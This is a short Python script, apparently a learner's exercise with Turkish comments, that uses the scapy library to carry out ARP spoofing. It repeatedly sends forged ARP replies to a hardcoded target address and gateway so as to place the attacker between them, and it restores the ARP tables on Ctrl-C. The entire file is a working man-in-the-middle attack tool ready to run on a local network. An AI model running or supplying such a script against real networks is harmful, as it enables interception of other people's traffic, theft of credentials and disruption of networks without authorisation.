#!/usr/bin/env python
# coding=utf-8
import scapy.all as scapy
import time
import sys


# We need to get Mac address of Ip's. So we use ARP protocol to get it
def getMac(ip):
    arpRequest = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")

    arpRequestBroadcast = broadcast/arpRequest

    answeredList = scapy.srp(arpRequestBroadcast, timeout=1, verbose=False)[0]
    try:
        return answeredList[0][1].hwsrc
    except IndexError:
        print("")

# Here, we create out own, fake packet for spoofing. Setting wrong source ip with spoof Ip.
def spoof(targetIp, spoofIp):
    targetMac = getMac(targetIp)
    packet = scapy.ARP(op=2, pdst=targetIp, hwdst=targetMac, psrc=spoofIp)
    scapy.send(packet, verbose=False)

# When out job is done we need to clean shits
def restore(destinationIp, sourceIp):
    destinationMac = getMac(destinationIp)
    sourceMac = getMac(sourceIp)
    packet = scapy.ARP(op=2, pdst=destinationIp, hwdst=destinationMac, psrc=sourceIp, hwsrc=sourceMac) #(op=2 -> this means a response not a request
    scapy.send(packet, count=6, verbose=False) # count yani 6 kere yolla


sendPacketCount = 0
targetIp = "10.30.161.177"
gatewayIp = "10.30.161.1"

try:

    while True:
        spoof(gatewayIp, targetIp)
        spoof(targetIp, gatewayIp)
        sendPacketCount += 2
        print("\r[+] Packet sent: " + str(sendPacketCount)),
        # python 2.7 de eğer print ifadelerinin aynı satırda yazılmasını istiyosan virgül koyuyorsun python3 için ise print içine vilgül koy ve end="" diyosun
        # eğer ifadeyi her seferinde başa yazmak istiyorsan \r koyuyorsun.
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Detected CTRL-C... Resetting ARP tables...")
    restore(gatewayIp, targetIp)
    restore(targetIp, gatewayIp)

